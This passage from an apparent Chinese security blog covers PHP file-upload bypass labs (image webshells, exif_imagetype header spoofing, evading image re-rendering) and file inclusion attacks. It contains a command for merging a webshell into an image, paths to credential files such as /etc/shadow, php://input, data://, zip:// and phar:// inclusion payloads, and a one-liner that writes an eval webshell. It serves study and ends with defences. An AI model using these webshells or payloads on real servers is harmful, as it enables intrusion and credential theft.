。但是遗憾的是图片文件可以包含文本注释；如果我们将图片文件和一句话木马文件合并成一个文件，那么这张图片就变成了一个图片马。当getimagesize()函数检查时，只会检查图片文件的二进制（十六进制）部分，不会检查一句话木马，所以它是一个真实有效的图片文件，但是它包含了木马程序。 这里我们还是要使用命令行合并文件，copy test.jpg/b + webshell.php/a shell.jpg，然后直接上传shell.php就OK了，注意这里要抓包看一下路径； 上传成功; 这里直接访问不会执行php代码，要结合文件包含来执行。 Pass-16(exif_imagetype())源码： 1234567891011121314151617181920212223242526272829303132333435function isImage($filename){ //需要开启php_exif模块 $image_type = exif_imagetype($filename); switch ($image_type) { case IMAGETYPE_GIF: return \"gif\"; break; case IMAGETYPE_JPEG: return \"jpg\"; break; case IMAGETYPE_PNG: return \"png\"; break; default: return false; break; }}$is_upload = false;$msg = null;if(isset($_POST['submit'])){ $temp_file = $_FILES['upload_file']['tmp_name']; $res = isImage($temp_file); if(!$res){ $msg = \"文件未知，上传失败！\"; }else{ $img_path = UPLOAD_PATH.\"/\".rand(10, 99).date(\"YmdHis\").\".\".$res; if(move_uploaded_file($temp_file,$img_path)){ $is_upload = true; } else { $msg = \"上传出错！\"; } }} exif_imagetype($filename)函数读取一个图像的第一个字节并检查其签名 ；使用图片格式的文件头就可以绕过。 先上传webshell.php，然后再抓包添加文件头，方法与Pass-14类似，或者上传图片马。 Pass-17（二次渲染）源码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384$is_upload = false;$msg = null;if (isset($_POST['submit'])){ // 获得上传文件的基本信息，文件名，类型，大小，临时文件路径 $filename = $_FILES['upload_file']['name']; $filetype = $_FILES['upload_file']['type']; $tmpname = $_FILES['upload_file']['tmp_name']; $target_path=UPLOAD_PATH.'/'.basename($filename); // 获得上传文件的扩展名 $fileext= substr(strrchr($filename,\".\"),1); //判断文件后缀与类型，合法才进行上传操作 if(($fileext == \"jpg\") &amp;&amp; ($filetype==\"image/jpeg\")){ if(move_uploaded_file($tmpname,$target_path)){ //使用上传的图片生成新的图片 $im = imagecreatefromjpeg($target_path); if($im == false){ $msg = \"该文件不是jpg格式的图片！\"; @unlink($target_path); }else{ //给新图片指定文件名 srand(time()); $newfilename = strval(rand()).\".jpg\"; //显示二次渲染后的图片（使用用户上传图片生成的新图片） $img_path = UPLOAD_PATH.'/'.$newfilename; imagejpeg($im,$img_path); @unlink($target_path); $is_upload = true; } } else { $msg = \"上传出错！\"; } }else if(($fileext == \"png\") &amp;&amp; ($filetype==\"image/png\")){ if(move_uploaded_file($tmpname,$target_path)){ //使用上传的图片生成新的图片 $im = imagecreatefrompng($target_path); if($im == false){ $msg = \"该文件不是png格式的图片！\"; @unlink($target_path); }else{ //给新图片指定文件名 srand(time()); $newfilename = strval(rand()).\".png\"; //显示二次渲染后的图片（使用用户上传图片生成的新图片） $img_path = UPLOAD_PATH.'/'.$newfilename; imagepng($im,$img_path); @unlink($target_path); $is_upload = true; } } else { $msg = \"上传出错！\"; } }else if(($fileext == \"gif\") &amp;&amp; ($filetype==\"image/gif\")){ if(move_uploaded_file($tmpname,$target_path)){ //使用上传的图片生成新的图片 $im = imagecreatefromgif($target_path); if($im == false){ $msg = \"该文件不是gif格式的图片！\"; @unlink($target_path); }else{ //给新图片指定文件名 srand(time()); $newfilename = strval(rand()).\".gif\"; //显示二次渲染后的图片（使用用户上传图片生成的新图片） $img_path = UPLOAD_PATH.'/'.$newfilename; imagegif($im,$img_path); @unlink($target_path); $is_upload = true; } } else { $msg = \"上传出错！\"; } }else{ $msg = \"只允许上传后缀为.jpg|.png|.gif的图片文件！\"; }} 首先检查后缀以及MINE类型。这里可以通过图片马绕过，下面主要介绍二次渲染的绕过方法； 这里建议使用gif格式的图片制作图片马，比较简单；先利用copy命令制作好图片马shell.gif，然后上传； 首先，这样做是肯定是不会成功的。不过我们可以通过比较图片马和上传后的图片来判断二次渲染未修改的内容，然后可以在未修改的内容中添加一句话木马绕过二次渲染。 将上传后的图片下载到本地，用十六进制编辑器打开，与上传之前的图片进行比较，在没有渲染的部分加上一句话木马，这个编辑器是把图片的内容替换成木马，不会影响图片的格式； 发现渲染后的图片中没有我们的一句话木马；找出没有被渲染的部分； 蓝色的部分就是没有被渲染的部分，在这里加上一句话木马； 重新上传，再将上传后的图片下载到本地打开，发现一句话还在，没有被去除，最后再结合文件包含就OK了。 jpg和png格式的图片绕过二次渲染比较复杂，可以参照文章：https://xz.aliyun.com/t/2657","link":"/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"},{"title":"文件包含","text":"文件包含文件包含： 为了开发者能够更快，更方便的编写代码，PHP引入了文件包含函数。通过文件包含函数可以加载另一个文件中的PHP代码，这可以为开发者节省大量的时间。文件包含可以包含任意文件，如图片，文本文件，压缩包等等，如果文件中有服务器能识别的脚本语言，就执行当前脚本语言代码，否则就直接显示出源代码。 漏洞成因： 虽然PHP文件包含函数可以为开发者节省大量时间，但是如果没有对包含的文件的来源进行严格的审查，就会导致任意文件读取或者任意命令执行。文件包含漏洞分为本地文件包含漏洞与远程文件包含漏洞，远程文件包含漏洞是因为开启了php配置文件中的allow_url_fopen选项（选项开启之后，服务器允许包含一个远程的文件）。 引发文件包含漏洞的函数： 12345678include()include_once()require()require_once()include()和require()的主要区别：include在包含的过程中如果出现错误，会抛出一个警告，程序继续正常运行；而require出现错误的时候，会直接报错并退出程序。include_once()和require_once()这两个函数，与前两个的不同之处在于这两个函数只包含一次，适用于在脚本执行期间同一个文件有可能被包括超过一次的情况下，确保它只被包括一次以避免函数重定义，变量重新赋值等问题。 常见的敏感文件路径: Windows系统 : 1234567891011c:\\boot.ini //查看系统版本c:\\windows\\system32\\inetsrv\\MetaBase.xml //IIS配置文件c:\\windows\\repair\\sam //存储Windows系统初次安装的密码c:\\Program Files\\mysql\\my.ini //MySQL配置c:\\Program Files\\mysql\\data\\mysql\\user.MYD // MySQL root密码c:\\windows\\php.ini //php 配置信息 Linux系统： 12345678910111213/etc/passwd // 账户信息/etc/shadow // 账户密码文件/usr/local/app/apache2/conf/httpd.conf // Apache2默认配置文件/usr/local/app/apache2/conf/extra/httpd-vhost.conf // 虚拟网站配置/usr/local/app/php5/lib/php.ini // PHP相关配置/etc/httpd/conf/httpd.conf // Apache配置文件/etc/my.conf // mysql 配置文件 远程文件包含 远程文件包含是指能够包含远程服务器上的文件并执行其中的PHP代码。由于远程服务器是我们可控的，因此漏洞一旦存在，危害会很大。 实现远程文件包含的条件： php配置文件（php.ini）： 配置完成后需要重启服务器。 远程文件包含漏洞所用到的函数： 本地文件包含 本地文件包含指的是能够打开并包含本地文件。大多数情况下，文件包含漏洞都是本地文件包含漏洞。 demo： 本地创建一个文件，test.php，文件内容如下： 12345&lt;?php $file = $_GET['file']; include($file);?&gt;//没有对参数$_GET['file']的内容进行过滤 我们演示包含的文件为test.txt，文件内容如下： 123&lt;?php echo phpinfo();?&gt; payload： 1http://localhost:8080/test.php?file=test.txt 结果： 本地文件包含的利用与绕过session文件包含： php伪协议（封装协议） PHP 带有很多内置 URL 风格的封装协议，可用于类似 fopen()、copy()、file_exists()和 filesize()的文件系统函数。 除了这些封装协议，还能通过 stream_wrapper_register()来注册自定义的封装协议。 php://filter(读取本地磁盘文件) 元封装器，设计用于”数据流打开”时的”筛选过滤”应用，对本地磁盘文件进行读写 。 利用条件：只是读取，所以只需要开启allow_url_fopen，对allow_url_include不做要求 。 payload： 1?file=php://filter/read=convert.base64-encode/resource=xxx.php 通过指定末尾文件，可以读取经过base64加密后的文件源码，虽然不能直接获取shell等，但能够读取敏感文件，危害还是比较大的。 demo： 这里只是单纯输出文件经过base64加密后的内容，并不执行脚本。 php://input 可以访问请求的原始数据的只读流。即可以直接读取到POST上没有经过解析的原始数据。 当设置enctype=”multipart/form-data” 的时候 php://input 是无效的。 利用条件：需要开启allow_url_include=on，对allow_url_fopen不做要求。 利用方法： ?php://input，数据直接通过post方式上传。 读取POST数据； 碰到file_get_contents( )函数就要想到用php://input绕过，因为php伪协议是可以利用http协议的，即可以通过POST方式传数据；file_get_contents( )函数是将文件内容得到字符串中，$homepage = file_get_contents('http://www.example.com/');所以有可能上传的木马不会执行，可以用php伪协议绕过。 测试代码： 12345&lt;?php error_reporting(0); $file = $_GET['file']; include($file);?&gt; payload: 1http://localhost:8080/test.php?file=php://input 写入木马； 利用条件：php配置文件中需同时开启 allow_url_fopen 和 allow_url_include（PHP &lt; 5.3.0）,就可以造成任意代码执行，在这里可以理解成远程文件包含漏洞（RFI），即POST过去PHP代码，即可执行。开启allow_url_include就是为了能够执行php代码（php://input，一句话木马）； 测试代码： 12345&lt;?php error_reporting(0); $file = $_GET['file']; include($file);?&gt; payload： 1http://localhost:8080/test.php?file=php://input 如果post的数据是一句话木马（php），就会在当前目录下写入一个木马。 一句话木马： 123&lt;?PHP fputs(fopen('shell.php','w'),'&lt;?php @eval($_POST[cmd])?&gt;');?&gt;//fputs()与fwrite()等效//开启allow_url_fopen是为了能够讲一句话木马写入文件存放到服务器上 命令执行； 利用条件：php配置文件中需同时开启 allow_url_fopen 和 allow_url_include（PHP &lt; 5.30）,就可以造成任意代码执行，在这里可以理解成远程文件包含漏洞（RFI），即POST过去PHP代码，即可执行； 测试代码： 12345&lt;?php error_reporting(0); $file = $_GET['file']; include($file);?&gt; payload： 1http://localhost:8080/test.php?file=php://input post方式上传待执行的命令： 1&lt;?php systerm('ipconfig') ?&gt; file://伪协议（读取文件内容） file:// 用于访问本地文件系统，读取到文件的内容，且不受allow_url_fopen与allow_url_include的影响。测试代码： 12345&lt;?php error_reporting(0); $file = $_GET['file']; include($file);?&gt; payload: 1http://localhost:8080/test.php?file=file://文件的绝对路径 但当文件内容为可执行脚本时，则会显示脚本执行后的内容； data://伪协议 数据流封装器，和php://相似都是利用了流的概念，将原本的include的文件流重定向到了用户可控制的输入流中，简单来说就是执行文件包含了你的输入流，通过你输入payload来获取； 用法：data://text/plain 和php伪协议的input类似，也可以执行任意代码，但利用条件和用法不同 条件：allow_url_fopen参数与allow_url_include都需开启; 用法1：?file=data://text/plain , 用法2：?file=data://text/plain ; base64 , base64编码后的php代码 em。。。好像没有复现成功。。。不知道是什么原因，自己本地写了一个test.php也不能复现成功，改了php版本试了也没用。。。 有时候可能需要将base64加密后的等号进行手动url编码，否则浏览器可能识别不了。 data:// 绕过file_get_contents( ); 123&lt;?php echo file_get_contents(‘data://text/plain;base64,SSBsb3ZlIFBIUAo='); ?&gt;&lt;?php echo file_get_contents('data://text/plain,&lt;?php phpinfo(); ?&gt;'); ?&gt; 如果php.ini里的allow_url_include=On（PHP &lt; 5.3.0）,就可以造成任意代码执行，同理在这就可以理解成远程文件包含漏洞（RFI）。 zip://伪协议 zip://可以访问压缩文件中的文件 。 利用条件： 使用zip协议，需要将#编码为%23，所以需要PHP 的版本&gt; =5.3.0，在window环境下要5.3.0&lt;PHP&lt;5.4；要是因为版本的问题无法将#编码成%23，可以手动把#改成%23； payload： 1?file=zip://[压缩文件路径]#[压缩文件内的子文件名] 高级利用：（适用于绕过对包含文件后缀的检测） 测试代码： 1234567&lt;?php $file = $_GET['file']; if(isset($file) &amp;&amp; strtolower(substr($file, -4) == \".jpg\")){ include($file); }?&gt;//strtolower — 将字符串转化为小写 这种情况下，不能直接包含一句话木马或PHP文件，限制只能上传jpeg格式的文件。那么这时候就可以使用zip://伪协议来进行绕过； 绕过： 首先写一个包含一句话木马的PHP文件webshell.php，然后用zip协议压缩为webshell.zip，然后再将后缀改为.jpg。这时候webshell.jpg还是会被当成压缩文件来解析，因为zip://这个参数就是php解压压缩包的一个函数，不管后缀是什么，都会当做压缩包来解压。 demo： （1）执行php代码： （2）一句话木马： phar://伪协议 与zip://协议类似，但用法不同；zip://伪协议中是用#把压缩文件路径和压缩文件的子文件名隔开，而phar://伪协议中是用/把压缩文件路径和压缩文件的子文件名隔开。 payload： 1?file=phar://[压缩文件路径]/[压缩文件内的子文件名] 防御方法1、PHP 中使用 open_basedir 配置限制访问在指定的区域；2、过滤 .（点）/（斜杠）\\（反斜杠）等特殊字符；3、尽量关闭allow_url_include配置 。","link":"/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"}],"tags":[{"name":"php代码审计","slug":"php代码审计","link":"/tags/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"name":"python爬虫","slug":"python爬虫","link":"/tags/python%E7%88%AC%E8%99%AB/"},{"name":"sql注入","slug":"sql注入","link":"/tags/sql%E6%B3%A8%E5%85%A5/"},{"name":"文件上传","slug":"文件上传","link":"/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"}],"categories":[{"name":"php代码审计","slug":"php代码审计","link":"/categories/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"name":"python爬虫","slug":"python爬虫","link":"/categories/python%E7%88%AC%E8%99%AB/"},{"name":"sql注入","slug":"sql注入","link":"/categories/sql%E6%B3%A8%E5%85%A5/"},{"name":"文件上传","slug":"文件上传","link":"/categories/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"}]}